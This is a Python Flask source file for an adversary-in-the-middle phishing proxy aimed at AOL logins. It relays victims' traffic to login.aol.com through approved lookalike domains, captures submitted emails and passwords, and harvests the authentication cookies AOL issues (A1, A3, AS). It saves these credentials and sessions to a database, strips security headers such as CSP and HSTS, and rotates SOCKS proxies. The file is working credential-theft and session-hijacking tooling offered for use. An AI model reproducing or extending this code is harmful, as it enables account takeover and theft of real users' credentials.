# aolapp.py - Clean version (NO TELEGRAM)
from flask import Flask, request, Response, jsonify, redirect, send_from_directory
import requests
import logging
import json
import os
import re
import hashlib
from datetime import datetime, timedelta
from http.cookies import SimpleCookie
from dotenv import load_dotenv
import cookie_manager_db
import time
import sqlite3
import random
import threading

load_dotenv()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'fallback-dev-key-here')

os.makedirs("sessions", exist_ok=True)

CONFIG = {
    'TIMEOUT': 30,
}

# ----------------- Database Functions -----------------
def get_db_connection():
    db_path = 'test_aol_vault.db'
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    return conn

def load_allowed_domains_from_db():
    try:
        conn = get_db_connection()
        if not conn:
            return []
        cursor = conn.cursor()
        cursor.execute("SELECT domain_name FROM domains WHERE domain_type = 'proxy' AND is_active = 1")
        domains = cursor.fetchall()
        conn.close()
        return [d['domain_name'] for d in domains]
    except Exception as e:
        print(f"Error loading domains: {e}")
        return []

def is_domain_allowed(host_header):
    allowed_domains = load_allowed_domains_from_db()
    domain = host_header.split(':')[0]
    if domain in allowed_domains:
        return True
    for allowed in allowed_domains:
        if allowed.startswith('*.') and domain.endswith(allowed[1:]):
            return True
    return False

# ----------------- Auth Manager -----------------
class AuthManager:
    def __init__(self):
        self.cookies = {}
        self.credentials = {}
        self.pending_email = {}
        self.pending_password = {}
        self.login_success_sent = set()
        self.user_sessions = {}
        self.session_challenge_status = {}
        self.session_last_request = {}
        self.session_final_url = {}

    def generate_session_id(self, request):
        ip = request.remote_addr
        ua = request.headers.get('User-Agent', '')
        return hashlib.md5(f"{ip}_{ua}".encode()).hexdigest()[:12]

    def save_credentials_temp(self, form_data, session_id):
        try:
            email = None
            password = None
            for k, v in form_data.items():
                kl = k.lower()
                if any(f in kl for f in ['username', 'email', 'login', 'userid']):
                    if v and '@' in v:
                        email = v
                        self.pending_email[session_id] = email
                        logger.info(f"📧 Email captured: {email}")
                if any(f in kl for f in ['password', 'passwd', 'pwd']):
                    if v and len(v) >= 1:
                        password = v
                        self.pending_password[session_id] = password
                        logger.info(f"🔑 Password captured (length: {len(v)})")
            if session_id in self.pending_email:
                email = self.pending_email[session_id]
            if session_id in self.pending_password:
                password = self.pending_password[session_id]
            if email and password:
                self.user_sessions[session_id] = email
                self.session_last_request[session_id] = time.time()
                logger.info(f"💾 Credentials stored in memory for {email}")
                return True
            return False
        except Exception as e:
            logger.error(f"Save error: {e}")
            return False

    def handle_response_cookies(self, resp, session_id):
        if session_id not in self.cookies:
            self.cookies[session_id] = {}
        for cookie in resp.cookies:
            self.cookies[session_id][cookie.name] = cookie.value
            logger.info(f"🍪 CAPTURED: {cookie.name}")
        for key, value in resp.headers.items():
            if key.lower() == 'set-cookie':
                try:
                    cookie = SimpleCookie()
                    cookie.load(value)
                    for name, morsel in cookie.items():
                        self.cookies[session_id][name] = morsel.value
                        logger.info(f"🍪 HEADER COOKIE: {name}")
                except:
                    match = re.search(r'^([^=]+)=([^;]+)', value)
                    if match:
                        name, val = match.group(1), match.group(2)
                        self.cookies[session_id][name] = val
                        logger.info(f"🍪 PARSE COOKIE: {name}")
        self.session_last_request[session_id] = time.time()
        self.session_final_url[session_id] = resp.url
        logger.info(f"📊 Total cookies for session {session_id[:8]}: {len(self.cookies[session_id])}")

    def get_email_for_session(self, session_id):
        if session_id in self.user_sessions:
            return self.user_sessions[session_id]
        if session_id in self.pending_email:
            return self.pending_email[session_id]
        return None

    def get_password_for_session(self, session_id):
        if session_id in self.pending_password:
            password = self.pending_password[session_id]
            if password:
                return password
        return None

    def is_login_complete(self, session_id):
        email = self.get_email_for_session(session_id)
        if not email:
            return False
        session_cookies = self.cookies.get(session_id, {})
        has_a1 = 'A1' in session_cookies
        has_a3 = 'A3' in session_cookies
        has_as = 'AS' in session_cookies
        has_session = 'S' in session_cookies or 'AP' in session_cookies
        has_oth = 'OTH' in session_cookies
        if has_a1 and has_a3 and has_as:
            final_url = self.session_final_url.get(session_id, '')
            is_on_main_domain = 'www.aol.com' in final_url or 'mail.aol.com' in final_url
            if is_on_main_domain or has_session or has_oth:
                logger.info(f"✅ LOGIN COMPLETE for {email}!")
                return True
        return False

    def finalize_success(self, session_id):
        email = self.get_email_for_session(session_id)
        password = self.get_password_for_session(session_id)
        if not email or not password:
            logger.warning(f"⚠️ Cannot finalize - missing credentials")
            return False
        if email in self.login_success_sent:
            logger.info(f"ℹ️ Already processed for {email}")
            return False
        all_cookies = self.cookies.get(session_id, {}).copy()
        total_cookies = len(all_cookies)
        has_a1 = 'A1' in all_cookies
        has_a3 = 'A3' in all_cookies
        has_as = 'AS' in all_cookies
        if not (has_a1 and has_a3 and has_as):
            logger.info(f"⏳ Waiting for complete auth cookies")
            return False
        logger.info(f"🎉 TRUE LOGIN SUCCESS: {email}")
        logger.info(f"📊 Total cookies: {total_cookies}")
        try:
            cookie_manager_db.save_credential(email, password)
            if all_cookies:
                result = cookie_manager_db.save_user_cookies(email, all_cookies)
                if result:
                    logger.info(f"✅ Cookies saved to database: {email} ({total_cookies} cookies)")
                else:
                    logger.warning(f"⚠️ Failed to save cookies for {email}")
            self.login_success_sent.add(email)
            self.login_success_sent.add(f"{email}_{session_id}")
            return True
        except Exception as e:
            logger.error(f"Finalize error: {e}", exc_info=True)
            return False

auth_manager = AuthManager()

# ----------------- Helper Functions -----------------
def modify_headers(headers, target_url):
    modified = {
        'Host': 'login.aol.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }
    if 'Referer' in headers:
        modified['Referer'] = headers['Referer']
    return modified

def modify_response_headers(headers):
    filtered = {}
    blocked = ['content-security-policy', 'x-frame-options', 'strict-transport-security', 'content-encoding', 'transfer-encoding']
    for k, v in headers.items():
        if k.lower() not in blocked:
            filtered[k] = v
    return filtered

# ----------------- Routes -----------------
@app.route('/downloads/<filename>')
def download_file(filename):
    return send_from_directory('sessions', filename, as_attachment=True)

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'])
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'])
def proxy_all(path):
    host_header = request.headers.get('Host', '')
    if not is_domain_allowed(host_header):
        logger.warning(f"Blocked request from unauthorized domain: {host_header}")
        return "Domain not authorized for proxy service", 403
    
    try:
        session_id = auth_manager.generate_session_id(request)
        if not path:
            target_url = "https://login.aol.com/"
        else:
            target_url = f"https://login.aol.com/{path.lstrip('/')}"
        if request.query_string:
            target_url += f"?{request.query_string.decode()}"
        logger.info(f"🌐 [{session_id[:8]}] {request.method} {target_url[:100]}")
        headers = modify_headers(request.headers, target_url)
        data = None
        if request.method == 'POST' and request.form:
            form_data = request.form.to_dict()
            if form_data:
                logger.info(f"📝 Form fields: {list(form_data.keys())}")
                auth_manager.save_credentials_temp(form_data, session_id)
                data = form_data
        elif request.method == 'POST' and request.data:
            data = request.get_data()
        session = requests.Session()
        cookies_to_send = auth_manager.cookies.get(session_id, {})
        resp = session.request(
            method=request.method,
            url=target_url,
            headers=headers,
            data=data,
            cookies=cookies_to_send,
            allow_redirects=True,
            timeout=CONFIG['TIMEOUT'],
            verify=True
        )
        all_cookies = session.cookies.get_dict()
        if session_id not in auth_manager.cookies:
            auth_manager.cookies[session_id] = {}
        for name, value in all_cookies.items():
            if name not in auth_manager.cookies[session_id]:
                auth_manager.cookies[session_id][name] = value
                logger.info(f"🍪 CAPTURED: {name}")
        auth_manager.handle_response_cookies(resp, session_id)
        logger.info(f"📨 Final Response: {resp.status_code} - {resp.url[:80]}")
        logger.info(f"🍪 Total cookies captured: {len(auth_manager.cookies[session_id])}")
        if auth_manager.is_login_complete(session_id):
            auth_manager.finalize_success(session_id)
        response = Response(resp.content, resp.status_code)
        for k, v in modify_response_headers(dict(resp.headers)).items():
            response.headers[k] = v
        for name, value in auth_manager.cookies.get(session_id, {}).items():
            response.headers.add('Set-Cookie', f"{name}={value}; Path=/; Secure; SameSite=None")
        return response
    except requests.Timeout:
        logger.error(f"Timeout error")
        return "Request timeout", 504
    except Exception as e:
        logger.error(f"❌ Proxy Error: {e}", exc_info=True)
        return f"Proxy Error: {str(e)}", 500

@app.route('/health')
def health():
    return jsonify({
        'status': 'healthy',
        'database_connected': cookie_manager_db.test_connection() if hasattr(cookie_manager_db, 'test_connection') else False
    })

# ==================== PROXY POOL MANAGER ====================
class ProxyPoolManager:
    def __init__(self):
        self.proxies = []
        self.user_proxy_map = {}
        self.last_refresh = None
        self.start_health_checker()
    
    def get_db_connection(self):
        db_path = 'test_aol_vault.db'
        conn = sqlite3.connect(db_path)
        conn.row_factory = sqlite3.Row
        return conn
    
    def load_proxies_from_db(self):
        try:
            conn = self.get_db_connection()
            cursor = conn.cursor()
            cursor.execute("""
                SELECT id, host, port, username, password, is_active, 
                       last_tested, last_success, error_count
                FROM proxies 
                WHERE is_active = 1
                AND (
                    last_success = 1 
                    OR last_tested IS NULL 
                    OR datetime(last_tested) > datetime('now', '-20 minutes')
                )
                ORDER BY error_count ASC, response_time_ms ASC
            """)
            proxies = cursor.fetchall()
            conn.close()
            self.proxies = []
            for p in proxies:
                self.proxies.append({
                    'id': p['id'],
                    'host': p['host'],
                    'port': p['port'],
                    'username': p['username'],
                    'password': p['password'],
                    'is_active': bool(p['is_active']),
                    'last_success': p['last_success'],
                    'error_count': p['error_count']
                })
            print(f"📊 Loaded {len(self.proxies)} live proxies from database")
            return self.proxies
        except Exception as e:
            print(f"❌ Error loading proxies: {e}")
            return []
    
    def get_proxy_for_user(self, session_id, email=None):
        if not self.proxies:
            print("⚠️ No live proxies available!")
            return None
        if session_id in self.user_proxy_map:
            assigned_proxy = self.user_proxy_map[session_id]
            print(f"🔄 User {session_id[:8]} using existing proxy: {assigned_proxy['host']}:{assigned_proxy['port']}")
            return assigned_proxy
        if email:
            for proxy in self.proxies:
                if proxy.get('assigned_email') == email:
                    self.user_proxy_map[session_id] = proxy
                    print(f"📧 User {email} using assigned proxy: {proxy['host']}:{proxy['port']}")
                    return proxy
        proxy = random.choice(self.proxies)
        self.user_proxy_map[session_id] = proxy
        if email:
            proxy['assigned_email'] = email
        print(f"🆕 Assigned new proxy to {session_id[:8]}: {proxy['host']}:{proxy['port']}")
        return proxy
    
    def mark_proxy_dead(self, proxy_id, error_message=None):
        try:
            conn = self.get_db_connection()
            cursor = conn.cursor()
            cursor.execute("""
                UPDATE proxies 
                SET last_success = 0,
                    error_count = error_count + 1,
                    last_tested = CURRENT_TIMESTAMP,
                    is_active = CASE WHEN error_count >= 3 THEN 0 ELSE is_active END
                WHERE id = ?
            """, (proxy_id,))
            conn.commit()
            conn.close()
            print(f"💀 Marked proxy {proxy_id} as dead")
            self.load_proxies_from_db()
        except Exception as e:
            print(f"Error marking proxy dead: {e}")
    
    def health_check_proxies(self):
        print("🏥 Running proxy health check...")
        try:
            conn = self.get_db_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT id, host, port, username, password FROM proxies WHERE is_active = 1")
            proxies = cursor.fetchall()
            conn.close()
            import socks
            import socket as sock_lib
            for proxy in proxies:
                try:
                    start_time = time.time()
                    socks.set_default_proxy(socks.SOCKS5, proxy['host'], proxy['port'],
                                           username=proxy['username'], password=proxy['password'])
                    sock_lib.socks = socks
                    sock = socks.socksocket()
                    sock.settimeout(10)
                    sock.connect(("api.ipify.org", 80))
                    sock.send(b"GET / HTTP/1.0\r\nHost: api.ipify.org\r\n\r\n")
                    response = sock.recv(1024)
                    sock.close()
                    response_time = (time.time() - start_time) * 1000
                    if response:
                        conn = self.get_db_connection()
                        cursor = conn.cursor()
                        cursor.execute("""
                            UPDATE proxies 
                            SET last_tested = CURRENT_TIMESTAMP,
                                last_success = 1,
                                response_time_ms = ?,
                                error_count = 0
                            WHERE id = ?
                        """, (response_time, proxy['id']))
                        conn.commit()
                        conn.close()
                        print(f"✅ Proxy {proxy['host']}:{proxy['port']} - OK ({response_time:.0f}ms)")
                    else:
                        raise Exception("No response")
                except Exception as e:
                    conn = self.get_db_connection()
                    cursor = conn.cursor()
                    cursor.execute("""
                        UPDATE proxies 
                        SET last_tested = CURRENT_TIMESTAMP,
                            last_success = 0,
                            error_count = error_count + 1,
                            is_active = CASE WHEN error_count >= 2 THEN 0 ELSE is_active END
                        WHERE id = ?
                    """, (proxy['id'],))
                    conn.commit()
                    conn.close()
                    print(f"❌ Proxy {proxy['host']}:{proxy['port']} - DEAD: {e}")
                finally:
                    socks.set_default_proxy(None)
            self.load_proxies_from_db()
        except Exception as e:
            print(f"Health check error: {e}")
    
    def start_health_checker(self):
        def health_check_loop():
            while True:
                time.sleep(20 * 60)
                self.health_check_proxies()
        thread = threading.Thread(target=health_check_loop, daemon=True)
        thread.start()
        print("🩺 Proxy health checker started (every 20 minutes)")
    
    def get_stats(self):
        return {
            'total_proxies': len(self.proxies),
            'live_proxies': len([p for p in self.proxies if p.get('last_success', False)]),
            'dead_proxies': len([p for p in self.proxies if not p.get('last_success', False)]),
            'active_users': len(self.user_proxy_map)
        }

proxy_pool = ProxyPoolManager()

@app.route('/admin/proxy-pool/stats')
def proxy_pool_stats():
    return jsonify({'success': True, 'stats': proxy_pool.get_stats(), 'proxies': proxy_pool.proxies})

@app.route('/admin/proxy-pool/health-check', methods=['POST'])
def trigger_health_check():
    proxy_pool.health_check_proxies()
    return jsonify({'success': True, 'message': 'Health check completed'})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5002))
    logger.info(f"🚀 AOL Proxy starting on port {port}")
    logger.info(f"💾 Using DATABASE for storage")
    logger.info(f"🔄 Following all redirects automatically")
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
